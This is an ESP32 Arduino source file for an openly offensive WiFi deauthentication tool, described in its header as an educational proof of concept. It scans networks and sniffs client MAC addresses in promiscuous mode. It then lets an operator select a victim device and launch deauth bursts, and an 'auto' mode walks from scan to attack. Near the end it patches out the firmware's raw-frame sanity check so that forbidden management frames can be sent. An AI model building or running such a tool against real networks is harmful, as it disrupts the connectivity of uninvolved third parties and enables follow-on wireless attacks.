/*
 * ESP32 WiFi Deauthentication Attack
 * Educational Proof of Concept for Network Systems Security
 * Simplified Serial-only version (no display, no buttons)
 * 
 * Hardware: ESP32 (any variant, no additional hardware required)
 * 
 * Serial commands:
 *   auto  - Interactive: scan, pick target, auto-attack
 *   start - Begin deauthentication attack
 *   stop  - Stop the attack
 */

#include <WiFi.h>
#include <esp_wifi.h>
#include <SPIFFS.h>

#include "config.h"
#include "settings_manager.h"
#include "network_attacks.h"
#include "deauth_utils.h"

// Forward declarations
void printMenu();
void processCommand(String cmd);
void printMAC(uint8_t* mac);
bool parseMAC(String macStr, uint8_t* mac);
void doScan();
bool doConnect(const char* ssid, const char* pass);
void wifiInitClean();
void handleAutoInput(String cmd);

// Global attack state
static bool deauthActive = false;
static unsigned long deauthStartTime = 0;

// Auto attack state machine
enum AutoState {
    AUTO_IDLE,
    AUTO_WAITING_AP_SELECT,
    AUTO_SNIFFING_CLIENTS,
    AUTO_WAITING_CLIENT_SELECT,
    AUTO_ATTACKING
};
static AutoState autoState = AUTO_IDLE;
static int autoApCount = 0;
static uint8_t autoApBssids[20][6];
static int autoApChannels[20];

// Client sniffing
#define MAX_SNIFFED_MACS 30
static uint8_t sniffedMacs[MAX_SNIFFED_MACS][6];
static int sniffedMacCount = 0;
static unsigned long autoStateStart = 0;

static bool macExists(const uint8_t* mac) {
    for (int i = 0; i < sniffedMacCount; i++) {
        if (memcmp(sniffedMacs[i], mac, 6) == 0) return true;
    }
    return false;
}

static void macToStr(const uint8_t* mac, char* buf) {
    sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

void IRAM_ATTR sniffCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    if (pkt->rx_ctrl.sig_len < 24) return;
    
    uint8_t* payload = pkt->payload;
    uint16_t fc = payload[0] | (payload[1] << 8);
    uint8_t frameType = (fc >> 2) & 0x3;
    if (frameType != 2) return;
    
    uint8_t* srcMac = &payload[10];
    if (srcMac[0] & 0x01) return;
    if (memcmp(srcMac, g_esp32_mac, 6) == 0) return;
    if (macExists(srcMac)) return;
    
    if (sniffedMacCount < MAX_SNIFFED_MACS) {
        memcpy(sniffedMacs[sniffedMacCount], srcMac, 6);
        sniffedMacCount++;
    }
}

// WiFi event handler
void WiFiEvent(WiFiEvent_t event) {
    switch (event) {
        case ARDUINO_EVENT_WIFI_STA_CONNECTED:
            Serial.println("\n[WiFi] Connected to AP");
            break;
        case ARDUINO_EVENT_WIFI_STA_GOT_IP:
            Serial.printf("\n[WiFi] Got IP: %s\n", WiFi.localIP().toString().c_str());
            break;
        default:
            break;
    }
}

void wifiInitClean() {
    WiFi.onEvent(WiFiEvent);
    WiFi.mode(WIFI_OFF);
    delay(100);
    WiFi.mode(WIFI_STA);
    WiFi.setAutoReconnect(false);
    WiFi.persistent(false);
    WiFi.setSleep(false);
    esp_wifi_set_ps(WIFI_PS_NONE);
    
    wifi_country_t country = {
        .cc = "01",
        .schan = 1,
        .nchan = 14,
        .policy = WIFI_COUNTRY_POLICY_MANUAL
    };
    esp_wifi_set_country(&country);
}

void doScan() {
    Serial.println("[*] Scanning for networks...");
    
    WiFi.disconnect(true);
    WiFi.setAutoReconnect(false);
    delay(500);
    WiFi.mode(WIFI_STA);
    WiFi.setSleep(false);
    
    int n = WiFi.scanNetworks();
    
    if (n == 0) {
        Serial.println("[-] No networks found");
    } else {
        Serial.printf("[+] Found %d networks:\n\n", n);
        Serial.println("Num | SSID                     | CH | RSSI | Security       | BSSID");
        Serial.println("----+--------------------------+----+------+----------------+-----------------");
        for (int i = 0; i < n; i++) {
            String ssid = WiFi.SSID(i);
            if (ssid.length() > 24) ssid = ssid.substring(0, 24);
            
            const char* security;
            switch (WiFi.encryptionType(i)) {
                case WIFI_AUTH_OPEN: security = "OPEN"; break;
                case WIFI_AUTH_WEP: security = "WEP"; break;
                case WIFI_AUTH_WPA_PSK: security = "WPA"; break;
                case WIFI_AUTH_WPA2_PSK: security = "WPA2"; break;
                case WIFI_AUTH_WPA_WPA2_PSK: security = "WPA/WPA2"; break;
                case WIFI_AUTH_WPA2_ENTERPRISE: security = "WPA2-ENT"; break;
                case WIFI_AUTH_WPA3_PSK: security = "WPA3"; break;
                case WIFI_AUTH_WPA2_WPA3_PSK: security = "WPA2/WPA3"; break;
                default: security = "UNKNOWN"; break;
            }
            
            Serial.printf("%3d | %-24s | %2d | %4d | %-14s | ", 
                i + 1, ssid.c_str(), WiFi.channel(i), WiFi.RSSI(i), security);
            printMAC(WiFi.BSSID(i));
        }
    }
    Serial.println();
    WiFi.scanDelete();
}

bool doConnect(const char* ssid, const char* pass) {
    Serial.printf("[*] Scanning for '%s'...\n", ssid);
    int n = WiFi.scanNetworks();
    
    int targetIndex = -1;
    for (int i = 0; i < n; i++) {
        if (strcmp(WiFi.SSID(i).c_str(), ssid) == 0) {
            targetIndex = i;
            break;
        }
    }
    
    if (targetIndex < 0) {
        Serial.printf("[-] Network '%s' not found in scan\n", ssid);
        WiFi.scanDelete();
        return false;
    }
    
    int channel = WiFi.channel(targetIndex);
    const uint8_t* bssid = WiFi.BSSID(targetIndex);
    const char* security;
    switch (WiFi.encryptionType(targetIndex)) {
        case WIFI_AUTH_OPEN: security = "OPEN"; break;
        case WIFI_AUTH_WPA_PSK: security = "WPA"; break;
        case WIFI_AUTH_WPA2_PSK: security = "WPA2"; break;
        case WIFI_AUTH_WPA_WPA2_PSK: security = "WPA/WPA2"; break;
        case WIFI_AUTH_WPA3_PSK: security = "WPA3"; break;
        case WIFI_AUTH_WPA2_WPA3_PSK: security = "WPA2/WPA3"; break;
        default: security = "UNKNOWN"; break;
    }
    
    Serial.printf("[+] Found '%s' on channel %d, security: %s, RSSI: %d\n", 
                  ssid, channel, security, WiFi.RSSI(targetIndex));
    
    WiFi.scanDelete();
    
    Serial.printf("[*] Connecting to '%s' (ch %d)...\n", ssid, channel);
    WiFi.disconnect(true);
    delay(500);
    WiFi.begin(ssid, pass, channel, bssid, true);
    
    int attempts = 0;
    while (WiFi.status() != WL_CONNECTED && attempts < 40) {
        delay(500);
        Serial.print(".");
        attempts++;
    }
    
    if (WiFi.status() == WL_CONNECTED) {
        Serial.println(" OK");
        Serial.print("    IP: "); Serial.println(WiFi.localIP());
        Serial.print("    BSSID: "); printMAC(WiFi.BSSID());
        memcpy(g_bssid, WiFi.BSSID(), 6);
        GATEWAY_IP = WiFi.gatewayIP();
        Serial.print("    Gateway: "); Serial.println(GATEWAY_IP);
        return true;
    } else {
        Serial.printf(" FAILED (status: %d)\n", WiFi.status());
        return false;
    }
}

void setup() {
    Serial.begin(115200);
    delay(1000);
    
    Serial.println("\n========================================");
    Serial.println("  ESP32 WiFi Deauth Attack - Serial Mode");
    Serial.println("========================================\n");
    
    wifiInitClean();
    
    if (!SPIFFS.begin(true)) {
        Serial.println("[-] SPIFFS mount failed");
    }
    
    settingsInit();
    if (!settingsLoad()) {
        Serial.println("[*] No config found, using defaults");
    }
    settingsApplyToGlobals();
    
    if (strcmp(g_settings.wifi_ssid, DEF_WIFI_SSID) != 0) {
        Serial.print("[*] Connecting to saved WiFi: ");
        Serial.println(g_settings.wifi_ssid);
        if (doConnect(g_settings.wifi_ssid, g_settings.wifi_pass)) {
            // Connected
        } else {
            Serial.println("[-] Use 'scan' to find networks, then 'connect <ssid> <pass>'");
        }
    } else {
        Serial.println("[*] No WiFi credentials configured. Use 'scan' then 'connect <ssid> <pass>'");
    }
    
    attacksInit();
    
    printMenu();
    Serial.println("[+] System ready! Type a command:");
}

void loop() {
    if (Serial.available()) {
        String cmd = Serial.readStringUntil('\n');
        cmd.trim();
        
        if (autoState != AUTO_IDLE) {
            handleAutoInput(cmd);
        } else {
            processCommand(cmd);
        }
    }
    
    attacksUpdate();
    
    // Auto state machine: sniffing timeout
    if (autoState == AUTO_SNIFFING_CLIENTS) {
        if (millis() - autoStateStart > 10000) {
            esp_wifi_set_promiscuous(false);
            
            if (sniffedMacCount == 0) {
                Serial.println("\n[-] No client devices detected on this channel.");
                Serial.println("    The network may be idle or devices are not transmitting.");
                Serial.println("    You can still deauth with a known MAC using: set_victim <mac>");
                autoState = AUTO_IDLE;
            } else {
                Serial.printf("\n[+] Detected %d device(s) on this network:\n\n", sniffedMacCount);
                Serial.println("Num | MAC Address         | Notes");
                Serial.println("----+---------------------+---------------------------");
                for (int i = 0; i < sniffedMacCount; i++) {
                    char macStr[18];
                    macToStr(sniffedMacs[i], macStr);
                    const char* note = (sniffedMacs[i][0] & 0x02) ? "Randomized MAC" : "";
                    Serial.printf("%3d | %-19s | %s\n", i + 1, macStr, note);
                }
                Serial.println();
                Serial.println("Select target device (number):");
                autoState = AUTO_WAITING_CLIENT_SELECT;
            }
        }
    }
    
    static unsigned long lastStatus = 0;
    if (millis() - lastStatus > 10000) {
        lastStatus = millis();
        if (deauthActive) {
            unsigned long elapsed = (millis() - deauthStartTime) / 1000;
            Serial.printf("[*] Deauth running for %lus | Frames: %d\n", elapsed, attacksGetCount(ATTACK_DEAUTH));
        }
    }
    
    delay(10);
}

void printMenu() {
    Serial.println("\n=== WiFi Deauthentication Attack ===");
    Serial.println("");
    Serial.println("--- Attack ---");
    Serial.println("  auto               - Interactive: scan, pick target, auto-attack");
    Serial.println("  start              - Start deauth attack");
    Serial.println("  stop               - Stop deauth attack");
    Serial.println("  set_burst <num>    - Set deauth burst count (default: 10)");
    Serial.println("");
    Serial.println("--- Network ---");
    Serial.println("  scan               - Scan for nearby WiFi networks");
    Serial.println("  connect <ssid> <pass> - Connect to WiFi network");
    Serial.println("  set_victim <mac>   - Set victim MAC (e.g., AA:BB:CC:DD:EE:FF)");
    Serial.println("  set_bssid <mac>    - Set BSSID/AP MAC");
    Serial.println("  set_channel <num>  - Set WiFi channel (1-14)");
    Serial.println("");
    Serial.println("--- Info ---");
    Serial.println("  status             - Show attack status");
    Serial.println("  config             - Show current config");
    Serial.println("  help               - Show this menu");
    Serial.println("=====================================\n");
}

void handleAutoInput(String cmd) {
    if (cmd == "cancel" || cmd == "stop") {
        if (autoState == AUTO_ATTACKING) {
            attacksStop(ATTACK_DEAUTH);
            deauthActive = false;
        }
        if (autoState == AUTO_SNIFFING_CLIENTS) {
            esp_wifi_set_promiscuous(false);
        }
        autoState = AUTO_IDLE;
        Serial.println("\n[*] Auto mode cancelled.");
        return;
    }
    
    if (autoState == AUTO_WAITING_AP_SELECT) {
        int num = cmd.toInt();
        if (num < 1 || num > autoApCount) {
            Serial.println("[-] Invalid selection. Enter a number or 'cancel'.");
            return;
        }
        
        int idx = num - 1;
        memcpy(g_bssid, autoApBssids[idx], 6);
        int channel = autoApChannels[idx];
        
        Serial.printf("\n[*] Selected network (BSSID: ");
        printMAC(g_bssid);
        Serial.printf("Channel: %d)\n", channel);
        
        deauthSetChannel(channel);
        
        // Start sniffing for clients
        Serial.println("\n[*] Sniffing for connected devices (10 seconds)...");
        Serial.println("    Type 'cancel' to stop early.\n");
        
        sniffedMacCount = 0;
        esp_wifi_set_promiscuous_rx_cb(&sniffCallback);
        esp_wifi_set_promiscuous(true);
        autoStateStart = millis();
        autoState = AUTO_SNIFFING_CLIENTS;
    }
    else if (autoState == AUTO_WAITING_CLIENT_SELECT) {
        int num = cmd.toInt();
        if (num < 1 || num > sniffedMacCount) {
            Serial.println("[-] Invalid selection. Enter a number or 'cancel'.");
            return;
        }
        
        int idx = num - 1;
        memcpy(VICTIM_MAC, sniffedMacs[idx], 6);
        
        char macStr[18];
        macToStr(VICTIM_MAC, macStr);
        Serial.printf("\n[*] Target selected: %s\n", macStr);
        
        Serial.println("[*] Starting deauth attack...\n");
        attacksStart(ATTACK_DEAUTH);
        deauthActive = true;
        deauthStartTime = millis();
        autoState = AUTO_ATTACKING;
        
        Serial.println("[+] Attack started! Monitor your target device.");
        Serial.println("    Type 'stop' to end the attack.");
    }
    else if (autoState == AUTO_ATTACKING) {
        if (cmd == "stop") {
            attacksStop(ATTACK_DEAUTH);
            deauthActive = false;
            autoState = AUTO_IDLE;
            Serial.println("[+] Attack stopped.");
        }
    }
}

void processCommand(String cmd) {
    if (cmd == "start") {
        if (!deauthActive) {
            Serial.println("[*] Starting WiFi deauthentication attack...");
            attacksStart(ATTACK_DEAUTH);
            deauthActive = true;
            deauthStartTime = millis();
            Serial.println("[+] Deauth attack started!");
        } else {
            Serial.println("[-] Deauth already running");
        }
    }
    else if (cmd == "stop") {
        if (deauthActive) {
            Serial.println("[*] Stopping deauth attack...");
            attacksStop(ATTACK_DEAUTH);
            deauthActive = false;
            Serial.printf("[+] Deauth stopped. Total frames: %d\n", attacksGetCount(ATTACK_DEAUTH));
        } else {
            Serial.println("[-] No deauth running");
        }
    }
    else if (cmd == "status") {
        Serial.println("\n=== Attack Status ===");
        Serial.print("Running: ");
        Serial.println(deauthActive ? "YES" : "NO");
        if (deauthActive) {
            unsigned long elapsed = (millis() - deauthStartTime) / 1000;
            Serial.printf("Duration: %lus | Frames sent: %d\n", elapsed, attacksGetCount(ATTACK_DEAUTH));
        }
        Serial.println("===================\n");
    }
    else if (cmd == "config") {
        Serial.println("\n=== Current Configuration ===");
        Serial.print("SSID: "); Serial.println(g_settings.wifi_ssid);
        Serial.print("ESP32 MAC: "); printMAC(g_esp32_mac);
        Serial.print("ESP32 IP: "); Serial.println(g_esp32_ip);
        wifi_second_chan_t second;
        uint8_t ch;
        esp_wifi_get_channel(&ch, &second);
        Serial.printf("Channel: %d (2.4GHz)\n", ch);
        Serial.println("");
        Serial.print("Victim MAC: "); printMAC(VICTIM_MAC);
        Serial.print("BSSID: "); printMAC(g_bssid);
        Serial.println("");
        Serial.print("Deauth Burst: "); Serial.println(g_settings.deauth_burst);
        Serial.println("==============================\n");
    }
    else if (cmd == "auto") {
        if (autoState != AUTO_IDLE) {
            Serial.println("[-] Auto mode already in progress. Type 'cancel' to abort.");
            return;
        }
        
        Serial.println("\n[*] Scanning for nearby WiFi networks...\n");
        
        attacksStopAll();
        WiFi.disconnect(true);
        WiFi.setAutoReconnect(false);
        delay(500);
        WiFi.mode(WIFI_STA);
        WiFi.setSleep(false);
        
        int n = WiFi.scanNetworks();
        autoApCount = n;
        
        if (n == 0) {
            Serial.println("[-] No networks found. Try again.");
            autoState = AUTO_IDLE;
            return;
        }
        
        Serial.printf("[+] Found %d networks:\n\n", n);
        Serial.println("Num | SSID                     | CH | RSSI | Security       | BSSID");
        Serial.println("----+--------------------------+----+------+----------------+-----------------");
        for (int i = 0; i < n; i++) {
            String ssid = WiFi.SSID(i);
            if (ssid.length() > 24) ssid = ssid.substring(0, 24);
            
            const char* security;
            switch (WiFi.encryptionType(i)) {
                case WIFI_AUTH_OPEN: security = "OPEN"; break;
                case WIFI_AUTH_WEP: security = "WEP"; break;
                case WIFI_AUTH_WPA_PSK: security = "WPA"; break;
                case WIFI_AUTH_WPA2_PSK: security = "WPA2"; break;
                case WIFI_AUTH_WPA_WPA2_PSK: security = "WPA/WPA2"; break;
                case WIFI_AUTH_WPA3_PSK: security = "WPA3"; break;
                case WIFI_AUTH_WPA2_WPA3_PSK: security = "WPA2/WPA3"; break;
                default: security = "UNKNOWN"; break;
            }
            
            memcpy(autoApBssids[i], WiFi.BSSID(i), 6);
            autoApChannels[i] = WiFi.channel(i);
            
            Serial.printf("%3d | %-24s | %2d | %4d | %-14s | ", 
                i + 1, ssid.c_str(), WiFi.channel(i), WiFi.RSSI(i), security);
            printMAC(WiFi.BSSID(i));
        }
        Serial.println();
        Serial.println("Select target network (number):");
        
        autoState = AUTO_WAITING_AP_SELECT;
    }
    else if (cmd == "scan") {
        WiFi.disconnect(true);
        WiFi.setAutoReconnect(false);
        delay(500);
        doScan();
    }
    else if (cmd.startsWith("connect ")) {
        int firstSpace = cmd.indexOf(' ');
        int secondSpace = cmd.indexOf(' ', firstSpace + 1);
        if (secondSpace > 0) {
            String ssid = cmd.substring(firstSpace + 1, secondSpace);
            String pass = cmd.substring(secondSpace + 1);
            
            attacksStopAll();
            wifiInitClean();
            WiFi.setAutoReconnect(false);
            
            if (doConnect(ssid.c_str(), pass.c_str())) {
                strlcpy(g_settings.wifi_ssid, ssid.c_str(), sizeof(g_settings.wifi_ssid));
                strlcpy(g_settings.wifi_pass, pass.c_str(), sizeof(g_settings.wifi_pass));
                settingsSave();
            }
        } else {
            Serial.println("[-] Usage: connect <ssid> <password>");
        }
    }
    else if (cmd.startsWith("set_victim ")) {
        String mac = cmd.substring(11);
        if (parseMAC(mac, VICTIM_MAC)) {
            Serial.print("[+] Victim MAC set to: ");
            printMAC(VICTIM_MAC);
        } else {
            Serial.println("[-] Invalid MAC format. Use: AA:BB:CC:DD:EE:FF");
        }
    }
    else if (cmd.startsWith("set_bssid ")) {
        String mac = cmd.substring(10);
        if (parseMAC(mac, g_bssid)) {
            Serial.print("[+] BSSID set to: ");
            printMAC(g_bssid);
        } else {
            Serial.println("[-] Invalid MAC format. Use: AA:BB:CC:DD:EE:FF");
        }
    }
    else if (cmd.startsWith("set_channel ")) {
        String ch = cmd.substring(12);
        int channel = ch.toInt();
        if (channel >= 1 && channel <= 14) {
            Serial.printf("[*] Setting channel %d...\n", channel);
            deauthSetChannel(channel);
            
            wifi_second_chan_t second;
            uint8_t actualCh;
            esp_wifi_get_channel(&actualCh, &second);
            
            if (actualCh == channel) {
                Serial.printf("[+] Channel set to: %d\n", channel);
            } else {
                Serial.printf("[-] Channel rejected! Tried %d, actual: %d\n", channel, actualCh);
            }
        } else {
            Serial.println("[-] Invalid channel. Use: 1-14");
        }
    }
    else if (cmd.startsWith("set_burst ")) {
        String num = cmd.substring(10);
        g_settings.deauth_burst = num.toInt();
        Serial.print("[+] Burst count set to: ");
        Serial.println(g_settings.deauth_burst);
    }
    else if (cmd == "help") {
        printMenu();
    }
    else if (cmd != "") {
        Serial.println("[-] Unknown command. Type 'help'");
    }
}

void printMAC(uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        if (mac[i] < 16) Serial.print("0");
        Serial.print(mac[i], HEX);
        if (i < 5) Serial.print(":");
    }
    Serial.println();
}

#include <stdint.h>

extern "C" {
    int ieee80211_raw_frame_sanity_check(void *buffer, int size) {
        return 0;
    }
}

bool parseMAC(String macStr, uint8_t* mac) {
    int values[6];
    if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", 
               &values[0], &values[1], &values[2], 
               &values[3], &values[4], &values[5]) == 6) {
        for (int i = 0; i < 6; i++) {
            mac[i] = (uint8_t)values[i];
        }
        return true;
    }
    return false;
}
